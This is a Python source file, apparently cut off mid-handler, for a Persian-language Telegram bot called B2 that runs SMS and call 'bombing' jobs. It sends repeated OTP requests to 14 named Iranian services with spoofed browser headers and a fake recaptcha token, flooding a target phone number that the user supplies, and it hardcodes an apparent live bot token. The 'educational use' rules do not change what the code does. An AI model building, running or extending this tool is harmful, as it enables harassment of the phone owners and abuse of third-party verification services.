# app.py
# -*- coding: utf-8 -*-
"""
🌵 B2 - Ultimate Edition v6.0
==============================
- Bot name: B2
- Reply Keyboard Menu (fancy)
- Inline only for actions
- Regular meaningful emojis
- Rules on /start
- Advanced Admin Panel
- Phone verification DISABLED
"""

import asyncio
import hashlib
import json
import logging
import os
import random
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Optional, Any

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.enums import ParseMode, ChatAction
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardButton, InlineKeyboardMarkup,
    KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove,
    BotCommand, BotCommandScopeDefault
)

# ============================================================
#                    🎨 COLORS
# ============================================================
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; WHITE = "\033[37m"
    BRED = "\033[91m"; BGREEN = "\033[92m"; BYELLOW = "\033[93m"
    BBLUE = "\033[94m"; BMAGENTA = "\033[95m"; BCYAN = "\033[96m"; BWHITE = "\033[97m"
    BBLACK = "\033[90m"
    BG_RED = "\033[41m"; BG_GREEN = "\033[42m"; BG_YELLOW = "\033[43m"

if os.name == "nt":
    os.system("")


class Fmt(logging.Formatter):
    LC = {"DEBUG": C.BBLACK, "INFO": C.BCYAN, "WARNING": C.BYELLOW,
          "ERROR": C.BRED, "CRITICAL": C.BG_RED + C.BWHITE + C.BOLD}
    LI = {"DEBUG": "🔍", "INFO": "ℹ️ ", "WARNING": "⚠️ ",
          "ERROR": "❌", "CRITICAL": "💀"}

    def format(self, r):
        c = self.LC.get(r.levelname, C.RESET)
        i = self.LI.get(r.levelname, "•")
        ts = datetime.fromtimestamp(r.created).strftime("%H:%M:%S")
        return (f"{C.BBLACK}[{ts}]{C.RESET} "
                f"{c}{C.BOLD}{i} {r.levelname:<8}{C.RESET} "
                f"{C.BMAGENTA}{r.name}{C.RESET} "
                f"{C.DIM}»{C.RESET} {c}{r.getMessage()}{C.RESET}")


def setup_logger():
    root = logging.getLogger()
    root.setLevel(logging.INFO)
    for h in root.handlers[:]:
        root.removeHandler(h)
    h = logging.StreamHandler(sys.stdout)
    h.setFormatter(Fmt())
    root.addHandler(h)
    for n in ("aiogram", "aiohttp", "asyncio"):
        logging.getLogger(n).setLevel(logging.WARNING)
    return logging.getLogger("B2")


log = setup_logger()


def banner():
    print(f"""
{C.BCYAN}{C.BOLD}
  ██████╗ ██████╗ 
  ██╔══██╗╚════██╗
  ██████╔╝ █████╔╝
  ██╔══██╗ ╚═══██╗
  ██████╔╝██████╔╝
  ╚═════╝ ╚═════╝ 
{C.RESET}
{C.BCYAN}              🌵 B2 — Ultimate Edition v6.0 🌵{C.RESET}
{C.BBLACK}              ─────────────────────────────────────{C.RESET}
""")


# ============================================================
#                    ⚙️ CONFIG
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8970854395:AAGAL3KW9SpDskkwmsNFNF4FEpbF3jEDsXM").strip()
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8094551428").split(",") if x.strip().isdigit()]
PROXY_URL = os.getenv("PROXY_URL", "").strip() or None

DATA_DIR = Path(os.getenv("DATA_DIR", "data"))
DATA_DIR.mkdir(exist_ok=True)

USERS_FILE = DATA_DIR / "users.json"
JOBS_FILE = DATA_DIR / "jobs.json"
STATS_FILE = DATA_DIR / "stats.json"
CONFIG_FILE = DATA_DIR / "config.json"

MAX_REQUESTS_PER_JOB = 500
DEFAULT_DELAY = 0.4
RATE_LIMIT_SECONDS = 25

BOT_NAME = "B2"


# ============================================================
#                    🚫 HIDDEN FILTER
# ============================================================
def _hash(phone: str) -> str:
    return hashlib.sha256(f"B2::{phone}".encode()).hexdigest()[:16]


_FORBIDDEN = {_hash("09058307549"), _hash("09300961521")}


# ============================================================
#                    💾 DATABASE
# ============================================================
class DB:
    def __init__(self):
        self._lock = asyncio.Lock()
        self.users: dict = {}
        self.jobs: dict = {}
        self.stats: dict = {
            "total_users": 0, "total_jobs": 0,
            "total_success": 0, "total_failed": 0,
            "blocked_attempts": 0,
        }
        self.config: dict = {
            "force_join_enabled": False,
            "force_join_channel": "",
            "force_join_channel_id": 0,
            "force_join_link": "",
            "verification_required": False,
            "bot_username": "",
        }
        self._load()

    def _load(self):
        self.users = self._read(USERS_FILE, {})
        self.jobs = self._read(JOBS_FILE, {})
        self.stats = self._read(STATS_FILE, self.stats)
        self.config = {**self.config, **self._read(CONFIG_FILE, {})}
        self.config["verification_required"] = False
        log.info(
            f"💾 DB loaded | 👥 {C.BCYAN}{len(self.users)}{C.RESET} users | "
            f"📦 {C.BCYAN}{len(self.jobs)}{C.RESET} jobs"
        )

    @staticmethod
    def _read(p: Path, d: Any) -> Any:
        if not p.exists():
            return d
        try:
            with open(p, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            log.warning(f"⚠️ Read {p}: {e}")
            return d

    @staticmethod
    def _write(p: Path, d: Any):
        tmp = p.with_suffix(p.suffix + ".tmp")
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(d, f, ensure_ascii=False, indent=2)
        os.replace(tmp, p)

    async def _save(self, which: str):
        async with self._lock:
            if which == "users":
                self._write(USERS_FILE, self.users)
            elif which == "jobs":
                self._write(JOBS_FILE, self.jobs)
            elif which == "stats":
                self._write(STATS_FILE, self.stats)
            elif which == "config":
                self._write(CONFIG_FILE, self.config)

    async def get_or_create(self, tg) -> dict:
        uid = str(tg.id)
        u = self.users.get(uid)
        if not u:
            u = {
                "user_id": tg.id,
                "username": tg.username or "",
                "first_name": tg.first_name or "",
                "joined_at": datetime.now().isoformat(),
                "is_banned": False,
                "rules_accepted": False,
                "phone_verified": True,
                "verified_phone": "",
                "total_jobs": 0, "total_success": 0, "total_failed": 0,
            }
            self.users[uid] = u
            self.stats["total_users"] += 1
            await self._save("users")
            await self._save("stats")
            log.info(
                f"👤 New user: {C.BGREEN}{tg.first_name}{C.RESET} "
                f"(@{tg.username}) — {C.BYELLOW}{tg.id}{C.RESET}"
            )
        return u

    def get(self, uid: int) -> Optional[dict]:
        return self.users.get(str(uid))

    def is_banned(self, uid: int) -> bool:
        u = self.users.get(str(uid))
        return bool(u and u.get("is_banned"))

    def has_rules(self, uid: int) -> bool:
        u = self.users.get(str(uid))
        return bool(u and u.get("rules_accepted"))

    async def accept_rules(self, uid: int):
        if (u := self.users.get(str(uid))):
            u["rules_accepted"] = True
            await self._save("users")

    async def set_banned(self, uid: int, banned: bool) -> bool:
        if not (u := self.users.get(str(uid))):
            return False
        u["is_banned"] = banned
        await self._save("users")
        return True

    def all_ids(self) -> list:
        return [int(k) for k in self.users.keys()]

    def user_stats(self, uid: int) -> dict:
        u = self.users.get(str(uid)) or {}
        return {
            "jobs": u.get("total_jobs", 0),
            "success": u.get("total_success", 0),
            "failed": u.get("total_failed", 0),
        }

    async def create_job(self, uid: int, phone: str, mode: str, count: int) -> str:
        jid = f"{int(time.time()*1000)}-{random.randint(1000,9999)}"
        self.jobs[jid] = {
            "id": jid, "user_id": uid, "phone": phone, "mode": mode,
            "count": count, "success": 0, "failed": 0, "rounds": 0,
            "status": "running",
            "started_at": datetime.now().isoformat(),
            "finished_at": None,
        }
        self.stats["total_jobs"] += 1
        await self._save("jobs")
        await self._save("stats")
        log.info(
            f"🚀 Job {C.BYELLOW}#{jid[-8:]}{C.RESET} | "
            f"🎯 {C.BCYAN}{phone}{C.RESET} | "
            f"🎛 {C.BMAGENTA}{mode}{C.RESET} | 🔁 {count}"
        )
        return jid

    async def finish_job(self, jid: str, success: int, failed: int,
                         rounds: int, status: str):
        j = self.jobs.get(jid)
        if not j:
            return
        j.update({
            "success": success, "failed": failed,
            "rounds": rounds, "status": status,
            "finished_at": datetime.now().isoformat(),
        })
        if (u := self.users.get(str(j["user_id"]))):
            u["total_jobs"] += 1
            u["total_success"] += success
            u["total_failed"] += failed
        self.stats["total_success"] += success
        self.stats["total_failed"] += failed
        await self._save("jobs")
        await self._save("users")
        await self._save("stats")
        icon = "🛑" if status == "stopped" else "✅"
        color = C.BYELLOW if status == "stopped" else C.BGREEN
        log.info(
            f"{icon} Job {C.BYELLOW}#{jid[-8:]}{C.RESET} | "
            f"{color}{status}{C.RESET} | "
            f"✅ {C.BGREEN}{success}{C.RESET} | "
            f"❌ {C.BRED}{failed}{C.RESET} | 🔁 {rounds}"
        )

    async def log_blocked(self, uid: int):
        self.stats["blocked_attempts"] += 1
        await self._save("stats")
        log.warning(f"🚫 Blocked attempt by {C.BYELLOW}{uid}{C.RESET}")

    async def set_config(self, **kw):
        self.config.update(kw)
        await self._save("config")


database = DB()


# ============================================================
#                    🎨 BUTTON HELPERS
# ============================================================
def b_primary(text: str, cb: str = None, url: str = None) -> InlineKeyboardButton:
    kwargs = {"text": f"▫️ {text}"}
    if url:
        kwargs["url"] = url
    else:
        kwargs["callback_data"] = cb or "noop"
    return InlineKeyboardButton(**kwargs)


def b_danger(text: str, cb: str = None, url: str = None) -> InlineKeyboardButton:
    kwargs = {"text": f"🔴 {text}"}
    if url:
        kwargs["url"] = url
    else:
        kwargs["callback_data"] = cb or "noop"
    return InlineKeyboardButton(**kwargs)


def b_success(text: str, cb: str = None, url: str = None) -> InlineKeyboardButton:
    kwargs = {"text": f"🟢 {text}"}
    if url:
        kwargs["url"] = url
    else:
        kwargs["callback_data"] = cb or "noop"
    return InlineKeyboardButton(**kwargs)


# ============================================================
#                    🌐 HTTP SERVICES
# ============================================================
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36",
]
T = aiohttp.ClientTimeout(total=10)


def ua():
    return random.choice(UA)


def norm(p: str) -> str:
    p = p.strip().replace(" ", "").replace("-", "")
    if p.startswith("+98"): p = "0" + p[3:]
    elif p.startswith("0098"): p = "0" + p[4:]
    elif p.startswith("98") and len(p) == 12: p = "0" + p[2:]
    elif p.startswith("9") and len(p) == 10: p = "0" + p
    return p


def valid_phone(p: str) -> bool:
    p = norm(p)
    return len(p) == 11 and p.startswith("09") and p.isdigit()


def is_forbidden(p: str) -> bool:
    return _hash(norm(p)) in _FORBIDDEN


# ---------- SMS Services ----------
async def sms_shabdiz(s, p, call=False):
    try:
        async with s.get("https://paneladmin.shabdizgroup.com/api/App/RequestVerifyCode",
                         params={"phoneNumber": p},
                         headers={"User-Agent": ua(), "Accept": "*/*",
                                  "Referer": "https://www.shabdizgroup.com/",
                                  "Origin": "https://www.shabdizgroup.com"},
                         timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_digikala(s, p, call=False):
    try:
        async with s.post("https://api.digikala.com/v1/user/authenticate/",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Referer": "https://www.digikala.com/",
                                   "Origin": "https://www.digikala.com"},
                          json={"backUrl": "/", "username": p, "otp_call": call},
                          timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_tetherland(s, p, call=False):
    try:
        async with s.post("https://service.tetherland.com/api/v5/login-register",
                          headers={"User-Agent": ua(), "Accept": "application/json",
                                   "Content-Type": "application/json",
                                   "Referer": "https://app.tetherland.com/",
                                   "Origin": "https://app.tetherland.com"},
                          json={"mobile": p,
                                "device_info": {"brand": "", "model": "", "browserVersion": "134.0",
                                                "app_version": "", "by": "web", "osName": "Windows",
                                                "osVersion": "10", "browserName": "Chrome",
                                                "platform": "web", "name": "PC", "device": "web"},
                                "otp_type": "call" if call else "sms", "device": "web"},
                          timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_namava(s, p, call=False):
    try:
        async with s.post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json;charset=utf-8",
                                   "X-Application-Type": "WebClient", "X-Client-Version": "2.64.0",
                                   "Origin": "https://www.namava.ir",
                                   "Referer": "https://www.namava.ir/auth/register-phone"},
                          json={"UserName": "+98" + p[1:]},
                          timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_shab(s, p, call=False):
    try:
        async with s.post("https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json;charset=UTF-8",
                                   "Referer": "https://www.shab.ir/",
                                   "Platform": "web", "Shab-App": "web",
                                   "Origin": "https://www.shab.ir"},
                          json={"mobile": p, "country_code": "+98"},
                          timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_azkivam(s, p, call=False):
    try:
        async with s.post("https://api.azkivam.com/auth/login",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Referer": "https://azkivam.com/", "Origin": "https://azkivam.com"},
                          json={"mobileNumber": p}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_mohit(s, p, call=False):
    try:
        async with s.post("https://api.mohit.online/api/auth/login",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Referer": "https://mohit.online/", "Origin": "https://mohit.online"},
                          json={"username": p, "app": "market"}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_melico(s, p, call=False):
    try:
        async with s.post("https://melico.ir/auth/check-user",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Referer": "https://my.melico.ir/", "Origin": "https://my.melico.ir"},
                          json={"username": p, "group": "my", "recaptcha_token": "abcd"},
                          timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_balad(s, p, call=False):
    try:
        async with s.post("https://account.api.balad.ir/api/web/auth/login/",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "device-id": "664f06ae-f2f1-457c-ade1-3461da43cd77",
                                   "Origin": "https://balad.ir", "Referer": "https://balad.ir/"},
                          json={"phone_number": p, "os_type": "W"}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_tapsi(s, p, call=False):
    try:
        async with s.post("https://api.tapsi.food/v1/api/Authentication/otp",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Referer": "https://tapsi.food/",
                                   "x-platform": "desktop", "x-app-version": "v1.2.09-prd",
                                   "Origin": "https://tapsi.food"},
                          json={"cellPhone": p}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_divar(s, p, call=False):
    try:
        async with s.post("https://api.divar.ir/v5/auth/authenticate",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/x-www-form-urlencoded",
                                   "Referer": "https://divar.ir/", "Origin": "https://divar.ir"},
                          data=f'{{"phone":"{p}"}}', timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_dgshahr(s, p, call=False):
    try:
        async with s.post("https://lend-b.dgshahr.com/user/login/",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Origin": "https://lend.dgshahr.com",
                                   "Referer": "https://lend.dgshahr.com/"},
                          json={"phone_number": p, "source": "bing-organic"}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_banimode(s, p, call=False):
    try:
        async with s.post("https://mobapi.banimode.com/api/v2/auth/request",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json;charset=utf-8",
                                   "platform": "web", "Origin": "https://www.banimode.com",
                                   "Referer": "https://www.banimode.com/"},
                          json={"phone": p}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_ibime(s, p, call=False):
    try:
        async with s.post("https://api.ibime.com/web/v1/account/otp",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Origin": "https://ibime.com", "Referer": "https://ibime.com/"},
                          json={"phoneNumber": p}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


SMS = [
    ("Shabdiz", sms_shabdiz), ("Digikala", sms_digikala), ("Tetherland", sms_tetherland),
    ("Namava", sms_namava), ("Shab", sms_shab), ("Azkivam", sms_azkivam),
    ("Mohit", sms_mohit), ("Melico", sms_melico), ("Balad", sms_balad),
    ("TapsiFood", sms_tapsi), ("Divar", sms_divar), ("DGShahr", sms_dgshahr),
    ("Banimode", sms_banimode), ("iBime", sms_ibime),
]
CALL = [("Digikala-Call", sms_digikala), ("Tetherland-Call", sms_tetherland)]


# ============================================================
#                    🚀 BOMB RUNNER
# ============================================================
class BombRunner:
    def __init__(self, phone, count, mode, jid="", delay=DEFAULT_DELAY, on_progress=None):
        self.phone = phone
        self.count = count
        self.mode = mode
        self.job_id = jid
        self.delay = delay
        self.on_progress = on_progress
        self.stop_flag = False
        self.success = 0
        self.failed = 0
        self.rounds = 0
        self._t0 = time.time()

    def stop(self):
        self.stop_flag = True

    async def _run(self, session, name, func, call=False):
        try:
            ok = await func(session, self.phone, call)
        except Exception:
            ok = False
        if ok:
            self.success += 1
        else:
            self.failed += 1

    async def run(self):
        if self.mode == "sms":
            services = [(n, f, False) for n, f in SMS]
        elif self.mode == "call":
            services = [(n, f, True) for n, f in CALL]
        else:
            services = ([(n, f, False) for n, f in SMS] +
                        [(n, f, True) for n, f in CALL])

        log.info(f"▶️ Start {C.BYELLOW}#{self.job_id[-8:]}{C.RESET} | "
                 f"{len(services)} services | {self.count} rounds")

        conn = aiohttp.TCPConnector(limit=30, ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            for r in range(self.count):
                if self.stop_flag:
                    log.warning(f"🛑 Stopped #{self.job_id[-8:]}")
                    break
                self.rounds = r + 1
                tasks = [asyncio.create_task(self._run(session, n, f, c))
                         for n, f, c in services]
                await asyncio.gather(*tasks, return_exceptions=True)
                if self.on_progress:
                    try:
                        await self.on_progress(self.rounds, self.count,
                                               self.success, self.failed)
                    except Exception as e:
                        log.warning(f"Progress: {e}")
                if self.stop_flag:
                    break
                await asyncio.sleep(self.delay)
        log.info(f"🏁 #{self.job_id[-8:]} in {round(time.time()-self._t0,1)}s")
        return {"rounds": self.rounds, "success": self.success,
                "failed": self.failed, "stopped": self.stop_flag}


# ============================================================
#                    🎛 STATES
# ============================================================
class S(StatesGroup):
    rules = State()
    join = State()
    menu = State()
    phone = State()
    count = State()
    broadcast = State()
    set_channel = State()
    admin_msg_user = State()
    admin_search = State()
    post_text = State()
    post_button_text = State()
    post_button_url = State()
    post_confirm = State()


ACTIVE: dict = {}
LAST_JOB: dict = {}
POST_DRAFT: dict = {}


# ============================================================
#                    📜 TEXTS
# ============================================================
RULES_TEXT = (
    "📜 <b>قوانین B2</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "1️⃣ استفاده فقط برای اهداف آموزشی و تستی.\n"
    "2️⃣ مسئولیت کامل بر عهده کاربر است.\n"
    "3️⃣ استفاده از شماره‌های شخصی دیگران بدون رضایت ممنوع.\n"
    "4️⃣ سیستم فیلتر هوشمند فعال است.\n"
    "5️⃣ تخلف = بن دائمی.\n\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "✅ با کلیک روی دکمه سبز، قوانین را می‌پذیرید و ثبت‌نام می‌کنید."
)


# ============================================================
#                    🎨 KEYBOARDS
# ============================================================
# ---------- Reply Keyboards (Main Menu) ----------
def kb_main_menu(is_admin: bool = False) -> ReplyKeyboardMarkup:
    """منوی اصلی به صورت Reply Keyboard - دکمه‌های پایین صفحه"""
    rows = [
        [KeyboardButton(text="📩 بمبر پیامک"), KeyboardButton(text="📞 بمبر تماس")],
        [KeyboardButton(text="🔥 بمبر ترکیبی")],
        [KeyboardButton(text="📊 آمار من"), KeyboardButton(text="🌐 آمار کلی")],
        [KeyboardButton(text="📖 راهنما"), KeyboardButton(text="📜 قوانین")],
    ]
    if is_admin:
        rows.append([KeyboardButton(text="👑 پنل ادمین")])
    return ReplyKeyboardMarkup(
        keyboard=rows,
        resize_keyboard=True,
        is_persistent=True,
        input_field_placeholder="👇 یک گزینه انتخاب کن..."
    )


def kb_cancel_reply() -> ReplyKeyboardMarkup:
    """دکمه لغو برای حالت انتظار"""
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="❌ لغو عملیات")]],
        resize_keyboard=True,
        one_time_keyboard=False,
        input_field_placeholder="برای لغو کلیک کن..."
    )


def kb_back_reply() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="🏠 منوی اصلی")]],
        resize_keyboard=True,
    )


# ---------- Inline Keyboards (Actions only) ----------
def kb_rules() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ پذیرش قوانین و ثبت‌نام", callback_data="accept_rules")],
        [InlineKeyboardButton(text="❌ انصراف", callback_data="reject_rules")],
    ])


def kb_join(link: str) -> InlineKeyboardMarkup:
    rows = []
    if link:
        rows.append([InlineKeyboardButton(text="📢 عضویت در کانال", url=link)])
    rows.append([InlineKeyboardButton(text="✅ عضو شدم", callback_data="check_join")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_stop(jid: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⏹ توقف", callback_data=f"stop:{jid}"),
         InlineKeyboardButton(text="📊 وضعیت", callback_data=f"status:{jid}")],
    ])


def kb_admin_inline() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 کاربران", callback_data="a_users"),
         InlineKeyboardButton(text="📦 جاب‌های فعال", callback_data="a_active")],
        [InlineKeyboardButton(text="🔍 جستجوی کاربر", callback_data="a_search")],
        [InlineKeyboardButton(text="📢 پیام همگانی", callback_data="a_broadcast"),
         InlineKeyboardButton(text="✉️ پیام به کاربر", callback_data="a_msg_user")],
        [InlineKeyboardButton(text="📮 ارسال پست به کانال", callback_data="a_post_channel")],
        [InlineKeyboardButton(text="🚀 ارسال لینک ربات به کانال", callback_data="a_send_bot_link")],
        [InlineKeyboardButton(text="🟢 فعال کردن عضویت اجباری", callback_data="a_join_on"),
         InlineKeyboardButton(text="🔴 غیرفعال کردن", callback_data="a_join_off")],
        [InlineKeyboardButton(text="⚙️ تنظیم کانال", callback_data="a_set_channel")],
        [InlineKeyboardButton(text="📊 آمار زنده", callback_data="a_live")],
        [InlineKeyboardButton(text="🏠 بازگشت به منو", callback_data="back_menu")],
    ])


def kb_user_manage(uid: int, banned: bool) -> InlineKeyboardMarkup:
    rows = []
    if banned:
        rows.append([InlineKeyboardButton(text="✅ آنبن کردن", callback_data=f"unban:{uid}")])
    else:
        rows.append([InlineKeyboardButton(text="🚫 بن کردن", callback_data=f"ban:{uid}")])
    rows.append([InlineKeyboardButton(text="✉️ ارسال پیام", callback_data=f"msg:{uid}")])
    rows.append([InlineKeyboardButton(text="◀️ بازگشت", callback_data="a_users")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_post_builder(has_text: bool, buttons_count: int) -> InlineKeyboardMarkup:
    rows = []
    rows.append([
        InlineKeyboardButton(text="✏️ متن پست", callback_data="post_set_text"),
        InlineKeyboardButton(text="🔘 افزودن دکمه", callback_data="post_add_button"),
    ])
    if buttons_count > 0:
        rows.append([InlineKeyboardButton(text="🗑 پاک کردن دکمه‌ها", callback_data="post_clear_buttons")])
    if has_text:
        rows.append([InlineKeyboardButton(text="📮 ارسال به کانال", callback_data="post_send")])
    rows.append([InlineKeyboardButton(text="👁 پیش‌نمایش", callback_data="post_preview")])
    rows.append([InlineKeyboardButton(text="❌ لغو", callback_data="post_cancel")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


# ============================================================
#                    🔐 HELPERS
# ============================================================
async def check_membership(bot: Bot, uid: int) -> bool:
    cfg = database.config
    if not cfg.get("force_join_enabled"):
        return True
    ch_id = cfg.get("force_join_channel_id", 0)
    if not ch_id:
        return True
    try:
        m = await bot.get_chat_member(ch_id, uid)
        return m.status in ("member", "administrator", "creator")
    except TelegramBadRequest as e:
        log.warning(f"⚠️ Membership check failed: {e}")
        return False
    except Exception as e:
        log.warning(f"⚠️ Membership check error: {e}")
        return False


def build_post_keyboard(buttons: list) -> Optional[InlineKeyboardMarkup]:
    if not buttons:
        return None
    rows = []
    for b in buttons:
        rows.append([InlineKeyboardButton(text=b["text"], url=b["url"])])
    return InlineKeyboardMarkup(inline_keyboard=rows)


# ============================================================
#                    🎯 ROUTER
# ============================================================
router = Router()


# ---------------------- /start ----------------------
@router.message(CommandStart())
async def cmd_start(m: Message, state: FSMContext):
    u = await database.get_or_create(m.from_user)

    if u.get("is_banned"):
        await m.answer("⛔️ شما از ربات مسدود شده‌اید.")
        await state.clear()
        return

    if not u.get("rules_accepted"):
        await m.answer(
            f"👋 سلام <b>{m.from_user.first_name}</b>\n\n"
            f"🌵 به <b>B2</b> خوش آمدی!\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{RULES_TEXT}",
            reply_markup=kb_rules(),
        )
        await state.set_state(S.rules)
        return

    if not await check_membership(m.bot, m.from_user.id):
        cfg = database.config
        await m.answer(
            f"📢 <b>عضویت اجباری</b>\n\n"
            f"برای استفاده از ربات، ابتدا در کانال ما عضو شوید:\n\n"
            f"سپس روی دکمه <b>عضو شدم</b> بزنید.",
            reply_markup=kb_join(cfg.get("force_join_link", "")),
            disable_web_page_preview=True,
        )
        await state.set_state(S.join)
        return

    is_admin = m.from_user.id in ADMIN_IDS
    await m.answer(
        f"👋 سلام <b>{m.from_user.first_name}</b>\n\n"
        f"🌵 به <b>B2</b> خوش آمدی!\n\n"
        f"{'👑 دسترسی ادمین فعال' if is_admin else '🎯 از منوی زیر انتخاب کن:'}",
        reply_markup=kb_main_menu(is_admin),
    )
    await state.set_state(S.menu)


# ---------------------- /help ----------------------
@router.message(Command("help"))
async def cmd_help(m: Message):
    await m.answer(
        "📖 <b>راهنما</b>\n\n"
        "1️⃣ حالت را انتخاب کن\n"
        "2️⃣ شماره هدف را بفرست\n"
        "3️⃣ تعداد راند را وارد کن\n"
        "4️⃣ منتظر بمان\n\n"
        "🛑 با دکمه <b>توقف</b> می‌توانی متوقف کنی",
        reply_markup=kb_main_menu(m.from_user.id in ADMIN_IDS),
    )


@router.message(Command("myid"))
async def cmd_myid(m: Message):
    await m.answer(f"🆔 <code>{m.from_user.id}</code>")


@router.message(Command("cancel"))
async def cmd_cancel(m: Message, state: FSMContext):
    await state.clear()
    POST_DRAFT.pop(m.from_user.id, None)
    await m.answer(
        "❌ لغو شد.",
        reply_markup=kb_main_menu(m.from_user.id in ADMIN_IDS),
    )
    await state.set_state(S.menu)


# ============================================================
#                    📋 REPLY KEYBOARD HANDLERS
# ============================================================
@router.message(F.text == "🏠 منوی اصلی")
async def go_main_menu(m: Message, state: FSMContext):
    is_admin = m.from_user.id in ADMIN_IDS
    await m.answer("🏠 منوی اصلی:", reply_markup=kb_main_menu(is_admin))
    await state.set_state(S.menu)


@router.message(F.text == "❌ لغو عملیات")
async def cancel_op(m: Message, state: FSMContext):
    await state.clear()
    await m.answer(
        "❌ عملیات لغو شد.",
        reply_markup=kb_main_menu(m.from_user.id in ADMIN_IDS),
    )
    await state.set_state(S.menu)


@router.message(F.text == "📩 بمبر پیامک")
async def menu_sms(m: Message, state: FSMContext):
    await start_mode(m, state, "sms")


@router.message(F.text == "📞 بمبر تماس")
async def menu_call(m: Message, state: FSMContext):
    await start_mode(m, state, "call")


@router.message(F.text == "🔥 بمبر ترکیبی")
async def menu_both(m: Message, state: FSMContext):
    await start_mode(m, state, "both")


async def start_mode(m: Message, state: FSMContext, mode: str):
    uid = m.from_user.id
    if not database.has_rules(uid):
        await m.answer("❌ ابتدا قوانین را بپذیر. /start را بزن.", reply_markup=kb_main_menu(uid in ADMIN_IDS))
        return
    if not await check_membership(m.bot, uid):
        await m.answer("❌ ابتدا عضو کانال شو.", reply_markup=kb_main_menu(uid in ADMIN_IDS))
        return

    await state.update_data(mode=mode)
    mode_fa = {"sms": "📩 پیامک", "call": "📞 تماس", "both": "🔥 ترکیبی"}[mode]

    wait = RATE_LIMIT_SECONDS - (time.time() - LAST_JOB.get(uid, 0))
    if wait > 0:
        await m.answer(f"⏳ {int(wait)} ثانیه دیگر تلاش کن.", reply_markup=kb_main_menu(uid in ADMIN_IDS))
        await state.set_state(S.menu)
        return

    await m.answer(
        f"✅ حالت: <b>{mode_fa}</b>\n\n"
